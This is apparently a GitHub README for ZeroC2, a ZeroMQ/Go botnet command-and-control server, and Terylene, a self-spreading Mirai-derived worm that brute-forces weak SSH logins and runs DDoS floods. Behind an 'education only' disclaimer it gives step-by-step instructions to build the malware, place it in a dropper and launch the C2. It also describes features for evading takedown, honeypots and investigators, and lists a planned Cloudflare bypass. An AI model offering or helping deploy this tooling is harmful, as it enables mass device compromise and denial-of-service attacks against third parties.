![ZeroC2](https://github.com/BishopFox/sliver/assets/93959737/37af624e-9935-40d2-b2ff-630c53e3ec21)


# WARNING
**THIS IS ONLY FOR EDUCATION PURPOSES**

**UTILIZING THIS FOR ACTUAL DDOS ATTACKS IS ABSOLUTELY CONDEMNED AND COULD RESULT IN SERIOUS LEGAL CONSEQUENCES**


## Still in DEVELOPMENT


## ZeroMq Description
Zeromq is a very low-level fast asynchronous messaging library that can handle large amounts of connections and requests under seconds. It was able to get a transfer rate of 10,000 messages per 15 milliseconds, or between 66,000 and 70,000 messages/s under low-latency and it was able to beat rabbitmq , kafka and many other network libraries. Additionally , zeromq lightweight and low level library made in C++ uses as little resources as possible while maintaining the best performance


[ZeroMq benchmark](http://wiki.zeromq.org/area:results "ZeroMq benchmark")

## ZeroMq + Golang
ZeroMQ and Golang is powerful combination for building distributed and scalable systems that can handle lots of requests. ZeroMQ is a messaging library that provides high-performance, asynchronous communication between applications, along with golang's simplicity, efficiency, and built-in support for concurrent and parallel programming, it makes the C2 very flexible, easy to manage, efficient at resource utilization and most importantly...fast


## ZeroC2
ZeroC2 is a ZMQ golang C2 server designed for botnet traffic control and carrying out ddos attacks , ZeroC2 accepts connection for terylene. ZeroC2 also has heartbeating sensor and it is able to transfer and migrate terylene to other ZeroC2 servers.

[ZeroC2 demonstration](https://www.youtube.com/watch?v=VG-fimAH65w "ZeroC2 server")

## Terylene
Terylene is a modified version of the previous mirai botnet using golang instead of C, it has improved feature of the previous version of mirai and able to carry out concurrent tasks. Terylene is self replicating and able to scan the network , identify weak ssh logins, and attempts to inject itself into the vulnerable devices directly, Instead of sending the vulnerable Device to the C2 for the C2 to infect.  Terylene is also able to carry out more Advanced ddos attacks that are adaptable with today's ddos security.


# Difference between Terylene and Mirai botnet

| **Terylene**                    | **Mirai botnet**                  |
|---------------------------------|-----------------------------------|
| spread through local network    | cant spread through local network |
| faster worm                     | slower worm                       |
| able to mitigate                | unable to mitigate                |
| stream socket attacks           | raw socket attacks                |
| targets almost all linux distro | targets all linux distro          |
| smarter Ddos techniques         | old school ddos techniques        |
| only targets one architecture   | targets all architecture          |

## Terylene vs Mirai Summary 

Mirai is able to target a wide range of IOT devices, however terylene is able to target the architecture that it is built in (because golang doesnt support cross compilation with C) . On the other hand Terylene has faster worm spreading rate than mirai, better traffic control, and smarter Ddos techniques. Terylene is the best botnet to infect powerful servers, while Mirai can infect all types of IOTs. 

# Difference between ZeroC2 and Mirai C2

| **ZeroC2**               | **Mirai C2**           |
|--------------------------|------------------------|
| Decentralized            | Centralized            |
| Fast flux and dynamic ip | Static ip              |
| High Fault tolerance     | little fault tolerance |
| botnet authentication    | No authentication      |
| fast messaging library   | builtin net libraries  |

## ZeroC2 vs Mirai C2 Summary

ZeroC2 incorporates advanced features like "Mother Priority" for redundancy, "Backoff and Retry" for resilience, and "Transfer or Migration" for evasion. These features are tailored for the efficient management of botnets. ZeroC2 allows a decentralized infrastructure to avoid detection and takedown efforts, while legitimate C2 servers are typically centralized and well-managed. ZeroC2 also secret messages to verify other ZeroC2 servers, preventing migration to honeypots or invalid locations, Legitimate C2 servers rely on standard authentication and verification practices for authorized access.

ZeroC2 Features:
```diff
# Duplex heartbeat monitoring
# connection deduplication mechanism
# Made in Golang + ZeroMq
# able to handle over 500k botnets
# heartbeat sensor to track bots
# migration and transfer
# Decentralized
```

Terylene Features:
```diff
# Duplex heartbeat monitoring
# Retrying and Backoff mechanism
# Mother priority mechanism
# Made in Golang
# Able to scan and spread through local network
# Builtin Loader
# Fast concurrent Worm spreading
# UDP, TCP, UDPRAPE, Modified UDP, HTTP, SYN flood
```

Updated features:

```diff
+ Fixed a critical error with the DDos communication
+ Replaced DNS with UDPRAPE (crafted UDP method)
```


Upcoming features:
```diff
- more ddos methods
- Cloudflare Bypass
- ZeroC2 and PolyC2 binding
- New Mirai Varient that works with terylene
```

# Debian based Setup
> Ubuntu , Debian , Kali, Parrot OS

### Install ZMQ + GO package using APT
```
sudo apt update
sudo apt upgrade
sudo apt-get install libzmq3-dev
sudo apt-get install golang-go
```

# Arch based setup
> Arch , BlackArch

### Install ZMQ + GO package using pacman

```
sudo pacman -Sy
sudo pacman -S zeromq
sudo pacman -S go
```


# Red Hat based setup
> CentOs, Rocky , Fedora

### Install ZMQ package using yum

```
sudo yum update
sudo dnf makecache --refresh
sudo yum install -y zeromq-devel
sudo yum install golang
```


# ZeroC2 and terylene setup

### Clone the repo
```
git clone https://github.com/polymaster3313/terylene.git
```

### setup the dependencies
```
cd terylene
sudo go mod init terylene
sudo go mod tidy
```

### edit the configs in config folder.

```
cd config
nano config.go
```

### build terylene and ZeroC2

```
cd server
sudo go build server.go
cd ..
cd mirai
sudo go build -ldflags="-s -w" terylene.go
```

### drop the terylene malware into the dropper

```
mv terylene ../server/dropper
```

### start the zeroC2

```
./server
```

>Enjoy ;)



# ZeroMq and Terylene More in Depth


## heart monitoring system

Unlike mirai botnet C2, ZeroMq make use of heartbeat monitoring to track the amount of bots available for the botmaster, we spawn a golang goroutine to send the heartbeat to all connected terylene using router sockets. make another goroutine that handles the recieved messages and store the last heartbeat message in a map for each connected terylene. Another gouroutine is spawned to check every 3 seconds if terylenes in the map have not recieved a heartbeat response of 5 seconds, thats when ZeroMq heartbeat monitor pronounce the terylene dead and removed from the list of connected terylene

![ZeroC2](https://github.com/polymaster3313/Polyaccess/assets/93959737/ae1d8bba-2fa4-4446-8fee-f610667dbfd0)

## transfer and migration

ZeroC2 **significant** move called "migration" or "transfer" are the most useful and unique feature so far. ZeroMq is able to control the network flow of terylene and able to make them connect to another ZeroC2 server, This can allow botmasters to transfer botnets to other botmasters using zeroC2 or even migrate all botnets to a new ZeroC2 server in case of an emergency or a defense mechanism to confuse Security researchers and investigators. ZeroC2 also needs to verify other ZeroC2 servers using a secret message to prevent migrating botnet to honeypots or invalid locations which will result to lost of terylene bots


![Migrationfinal(1)](https://github.com/polymaster3313/Polyaccess/assets/93959737/32e205e3-e817-4b5b-ad98-7593420b7589)

# connection deduplication

Every time a terylene connects to a ZeroC2 server, it will have a special connection ID that is hashed with its public ip and local ip. ZeroC2 will log the connection ID and monitor it with heartbeat. This will effectively prevent double connection from the same device.By using this technique, the server can prevent multiple connections from the same client device. If the same client attempts to establish a new connection while an existing connection is active (based on the same connection ID), the server can reject the new connection or take appropriate action to handle the situation. This implementation can be more resource sufficient for the server and easier load balancing for the future.

![connection deduplication](https://github.com/polymaster3313/Polyaccess/assets/93959737/d3afa189-bc73-439c-b575-d2b9fbb12d59)


# Backoff and Retry

When the ZeroC2 suddenly experience an outrage or connection issue. Terylene will be able detect the server outrage with its duplex heartbeat monitoring. It will then quickly **Backoff** from the server, aborting the connection, and reconnect to it after 30min and have a timeout connection of 5h. This prevents terylene to be lost due to sudden outrage or DDOS from other C2 servers. Exponential backoff enhances the fault tolerance of the client-server communication. When a server outage or connection issue occurs, the client doesn't immediately flood the server with connection attempts, which could exacerbate the problem. Instead, it backs off, reducing the load on the server and the network.

## connection deduplication , Backoff and Retry Demonstration

https://github.com/polymaster3313/Polyaccess/assets/93959737/4315b8ee-97c6-4fa3-9be9-e0b54f3f1cf0

PS: If connection timed out (5h) , Terylene will pronounce the C2 as dead, **mother priority** will be activated

# Mother priority

Mother Priority is a noteworthy feature within the ZeroC2 system. Particularly interesting for its role in ensuring the resilience of the Terylene botnet's command and control (C2) infrastructure. Within the Terylene botnet, ZeroC2 categorizes servers into two key roles: 'Mother C2' and 'foster C2.' Mother C2 is the C2 that terylene first ever connected to and its considered its "birthplace", terylene will always remember their mother ip and connection details. The foster C2 is the C2 that the mother transfers the terylene to, named after "foster parents". Mother priority is only activated when the foster is pronounced dead by terylene. Terylene will then abandone the foster and connect to the Mother server, and this time, the timeout connection is 1month before pronouncing the mother as dead. Mother Priority is designed to provide redundancy and fault tolerance. If one C2 server is compromised or unavailable, the botnet can quickly revert to its primary C2 server to maintain control and coordination. 

Addtionally: If the mother is pronounced dead, the terylene will **abort and kill itself**

![mother](https://github.com/polymaster3313/Polyaccess/assets/93959737/197b2d09-8b81-40b6-b73d-e5b14df6c5ff)



